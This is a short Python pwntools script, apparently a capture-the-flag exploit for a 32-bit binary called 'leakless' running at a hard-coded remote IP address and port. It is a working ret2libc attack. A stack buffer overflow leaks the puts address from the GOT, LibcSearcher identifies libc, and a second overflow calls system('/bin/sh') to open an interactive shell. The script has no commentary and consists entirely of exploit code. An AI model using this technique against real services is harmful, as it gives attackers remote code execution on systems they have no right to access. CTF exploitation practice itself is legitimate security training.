from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

p = remote("35.243.188.20" , 2002)
elf = ELF("./leakless")

payload = "a" * 0x48 + "b" * 4 + p32(elf.plt["puts"]) + p32(elf.sym["feedme"]) + p32(elf.got["puts"])
p.sendline(payload)
puts_addr = u32(p.recv(4))
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

payload = "a" * 0x48 + "b" * 4 + p32(system) + p32(elf.sym["feedme"]) + p32(str_bin_sh)
p.sendline(payload)

p.interactive()